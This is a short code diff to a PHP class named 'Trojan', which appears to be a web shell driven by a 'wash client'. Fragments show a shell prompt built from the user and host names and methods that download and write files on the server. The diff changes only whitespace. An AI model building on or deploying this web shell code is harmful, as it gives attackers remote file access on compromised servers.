@@ -96,7 +96,9 @@ class Trojan{
         return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
     }
 
-    /**
+    
+
+/**
  * Downloads a file
  *
  * @param string $args             Arguments passed from the wash client
@@ -117,6 +119,9 @@ public function payload_feh($args){
     else { echo "File does not exist."; }
     die();
 }
+
+
+
 /**
  * Downloads a file
  *
@@ -194,6 +199,7 @@ public function payload_file_write($args){
     }
     $this->send_response();
 }
+
 
 
 }
